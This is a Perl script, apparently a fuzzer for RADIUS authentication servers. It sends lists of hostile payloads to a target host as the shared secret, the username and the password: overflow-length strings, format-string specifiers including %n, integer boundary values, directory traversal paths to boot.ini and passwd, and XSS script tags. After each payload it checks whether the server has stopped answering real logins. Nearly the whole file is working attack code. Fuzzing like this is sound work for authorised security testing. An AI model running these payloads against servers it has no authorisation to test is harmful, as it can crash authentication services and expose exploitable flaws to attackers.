#!/usr/bin/perl
use Authen::Simple::RADIUS;
$|=1;

@bfo=(
'A'x5,
'A'x17,
'A'x33,
'A'x65,
'A'x76,
'A'x129,
'A'x257,
'A'x513,
'A'x1024,
'A'x2049,
'A'x4097,
'A'x8193,
'A'x12288
);
@fse=(
'%s%p%x%d',
'024d',
'%.2049d',
'%p%p%p%p',
'%x%x%x%x',
'%d%d%d%d',
'%s%s%s%s',
'%99999999999s',
'%08x',
'%%20d',
'%%20n',
'%%20x',
'%%20s',
'%s%s%s%s%s%s%s%s%s%s',
'%p%p%p%p%p%p%p%p%p%p',
'%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%',
'%s'x129,
'%x'x257
);
@int=(
'-1',
'0',
'0x100',
'0x1000',
'0x3fffffff',
'0x7ffffffe',
'0x7fffffff',
'0x80000000',
'0xfffffffe',
'0xffffffff',
'0x10000',
'0x100000',
'1'
);
@directory_traversal=(
'..\boot.ini',
'..\..\boot.ini',
'..\..\..\boot.ini',
'..\..\..\..\boot.ini',
'..\..\..\..\..\boot.ini',
'..\..\..\..\..\..\boot.ini',
'..\..\..\..\..\..\..\boot.ini',
'../boot.ini',
'../../boot.ini',
'../../../boot.ini',
'../../../../boot.ini',
'../../../../../boot.ini',
'../../../../../../boot.ini',
'../../../../../../../boot.ini',
'c:\boot.ini',
'\c:\boot.ini',
'..\c:\boot.ini',
'..\..\c:\boot.ini',
'..\..\..\c:\boot.ini',
'..\..\..\..\c:\boot.ini',
'..\..\..\..\..\c:\boot.ini',
'..\..\..\..\..\..\c:\boot.ini',
'c:\boot.ini',
'/c:\boot.ini',
'../c:\boot.ini',
'../../c:\boot.ini',
'../../../c:\boot.ini',
'../../../../c:\boot.ini',
'../../../../../c:\boot.ini',
'../../../../../../c:\boot.ini',
'../passwd',
'../../passwd',
'../../../passwd',
'../../../../passwd',
'../../../../../passwd',
'../../../../../../passwd',
'../../../../../../../passwd',
'..\passwd',
'..\..\passwd',
'..\..\..\passwd',
'..\..\..\..\passwd',
'..\..\..\..\..\passwd',
'..\..\..\..\..\..\passwd',
'..\..\..\..\..\..\..\passwd'
);
@xss=(
'<script>alert("XSS")</script>',
'><script>alert(/XSS/)</script>',
'<iframe src="vbscript:alert()">',
'><iframe src="vbscript:alert()">'
);
@all=@bfo;
push(@all, @fse);
push(@all, @int);
push(@all, @directory_traversal);
push(@all, @xss);

$host=shift || die "usage: $0 host\n";

sub checkit($$$$){
	$target_host=shift;
	$target_realusername=shift;
	$target_realpassword=shift;
	$target_secret=shift;
#	print "-----\n";
#	print "\$target_host=$target_host\n";
#	print "\$target_secret=$target_secret\n";
#	print "\$target_realusername=$target_realusername\n";
#	print "\$target_realpassword=$target_realpassword\n";
	$radius_check = Authen::Simple::RADIUS->new(
	    host   => $target_host,
	    secret => $target_secret
	);
	if ( $radius_check->authenticate( $target_realusername, $target_realpassword ) ) {
		#print "pass!\n";
		return 1;
	}else{
		#print "fail!\n";
		return 0;
	}
}


print "real_username : ";
$real_username=<STDIN>;
chop($real_username);

print "real_password : ";
$real_password=<STDIN>;
chop($real_password);

print "real_secret : ";
$real_secret=<STDIN>;
chop($real_secret);


print "SECRET Fuzzing ... \n";
foreach $secret (@all){
	$radius = Authen::Simple::RADIUS->new(
 	   host   => $host,
 	   secret => $secret
	);
	$username=$real_username;
	$password=$real_password;
	$radius->authenticate( $username, $password );
#	print &checkit($host, $real_username, $real_password, $real_secret)."\n";
	if( &checkit($host, $real_username, $real_password, $real_secret) ){
		next;
	}else{
		print "Fuzzing Payload is \'$secret\' ... Press [ENTER] to continue ... \n";
		<STDIN>;
	}
}
print "SECRET Fuzzing ... Finish!\n";



print "USERNAME Fuzzing ... \n";
foreach $username (@all){
	$radius = Authen::Simple::RADIUS->new(
 	   host   => $host,
 	   secret => $real_secret
	);
	$password=$real_password;
	$radius->authenticate( $username, $password );
#	print &checkit($host, $real_username, $real_password, $real_secret)."\n";
	if( &checkit($host, $real_username, $real_password, $real_secret) ){
		next;
	}else{
		print "Fuzzing Payload is \'$username\' ... Press [ENTER] to continue ... \n";
		<STDIN>;
	}
}
print "USERNAME Fuzzing ... Finish!\n";



print "PASSWORD Fuzzing ... \n";
foreach $password (@all){
	$radius = Authen::Simple::RADIUS->new(
 	   host   => $host,
 	   secret => $real_secret
	);
	$username=$real_username;
	$radius->authenticate( $username, $password );
#	print &checkit($host, $real_username, $real_password, $real_secret)."\n";
	if( &checkit($host, $real_username, $real_password, $real_secret) ){
		next;
	}else{
		print "Fuzzing Payload is \'$password\' ... Press [ENTER] to continue ... \n";
		<STDIN>;
	}
}
print "PASSWORD Fuzzing ... Finish!\n";
exit(1);